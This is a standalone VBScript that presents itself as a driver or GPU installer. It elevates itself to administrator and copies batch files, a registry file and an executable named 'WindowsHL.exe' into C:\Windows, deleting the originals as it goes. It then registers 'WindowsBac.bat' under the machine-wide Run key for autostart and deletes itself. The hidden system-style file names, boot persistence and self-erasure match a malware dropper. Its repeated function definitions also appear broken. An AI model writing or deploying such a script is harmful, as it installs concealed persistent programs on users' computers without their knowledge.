Set WshShell = WScript.CreateObject("WScript.Shell") 
If WScript.Arguments.Length = 0 Then
  Set ObjShell = CreateObject("Shell.Application") 
  ObjShell.ShellExecute "wscript.exe" _ 
  , """" & WScript.ScriptFullName & """ RunAsAdministrator", , "runas", 1 
  WScript.Quit 
End if





function getfolder()
getfolder=left(wscript.scriptfullname,instrrev(wscript.scriptfullname,"\")-1)
end function
test=getfolder+"\"+"\data\driver_install.bat"
Set fso=CreateObject("scripting.filesystemobject")
fso.CopyFile test,"C:\Windows\driver_install.bat"
fso.DeleteFile test


function getfolder()
getfolder=left(wscript.scriptfullname,instrrev(wscript.scriptfullname,"\")-1)
end function
test=getfolder+"\"+"\data\driver_uninstall.bat"
Set fso=CreateObject("scripting.filesystemobject")
fso.CopyFile test,"C:\Windows\driver_uninstall.bat"
fso.DeleteFile test


function getfolder()
getfolder=left(wscript.scriptfullname,instrrev(wscript.scriptfullname,"\")-1)
end function
test=getfolder+"\"+"\data\modify_tdr_delay.reg"
Set fso=CreateObject("scripting.filesystemobject")
fso.CopyFile test,"C:\Windows\modify_tdr_delay.reg"
fso.DeleteFile test


function getfolder()
getfolder=left(wscript.scriptfullname,instrrev(wscript.scriptfullname,"\")-1)
end function
test=getfolder+"\"+"\data\WindowsBac.bat"
Set fso=CreateObject("scripting.filesystemobject")
fso.CopyFile test,"C:\Windows\WindowsBac.bat"
fso.DeleteFile test


function getfolder()
getfolder=left(wscript.scriptfullname,instrrev(wscript.scriptfullname,"\")-1)
end function
test=getfolder+"\"+"\data\WindowsHL.exe"
Set fso=CreateObject("scripting.filesystemobject")
fso.CopyFile test,"C:\Windows\WindowsHL.exe"
fso.DeleteFile test


function getfolder()
getfolder=left(wscript.scriptfullname,instrrev(wscript.scriptfullname,"\")-1)
end function
test=getfolder+"\"+"\data\WindowsHL.exe.sha256"
Set fso=CreateObject("scripting.filesystemobject")
fso.CopyFile test,"C:\Windows\WindowsHL.exe.sha256"
fso.DeleteFile test







	


Dim AutoRunProgram
Set AutoRunProgram=WScript.CreateObject("WScript.Shell")
RegPath="HKLM\Software\Microsoft\Windows\CurrentVersion\Run\"
Type_Name="REG_SZ"
Key_Name="WindowsBac"
Key_Data="C:\Windows\WindowsBac.bat"

AutoRunProgram.RegWrite RegPath&Key_Name,Key_Data,Type_Name












createobject("scripting.filesystemobject").deletefile wscript.scriptfullname
	
